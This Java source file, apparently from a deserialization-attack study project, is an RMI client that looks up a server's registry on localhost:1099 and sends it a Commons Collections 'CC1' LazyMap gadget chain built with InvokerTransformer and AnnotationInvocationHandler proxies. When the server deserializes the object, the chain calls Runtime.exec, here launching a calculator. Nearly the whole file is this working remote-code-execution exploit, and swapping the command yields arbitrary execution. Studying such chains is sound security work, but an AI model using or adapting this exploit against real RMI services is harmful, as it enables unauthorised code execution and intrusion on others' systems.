package org.example.clientAttackServerPlus;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

public class Client {
    public static void main(String[] args) throws Exception {
        // 1.get the stub of registry
        Registry registry = LocateRegistry.getRegistry("localhost", 1099);
        // get the stub of remote object
        RemoteObjectInterface stub = (RemoteObjectInterface) registry.lookup("remoteObject");
        // invoke the method of remote object
        stub.vulFunc(getCCPayload());
    }
    public static Object getCCPayload() throws Exception {
        //CC1-LazyMap
        Transformer[] transformers =  new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"Calc"})
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put("key","value");
        Map lazyMap = (Map) LazyMap.decorate(hashMap,chainedTransformer);
//        lazyMap.get("Jasper");
        Class<?> aihClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor aihConstuctor = aihClass.getDeclaredConstructor(Class.class,Map.class);
        aihConstuctor.setAccessible(true);
        InvocationHandler aih = (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMap);
        Map lazyMapProxy = (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),aih);

        InvocationHandler aih2 = (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMapProxy);
        return aih2;
    }
}
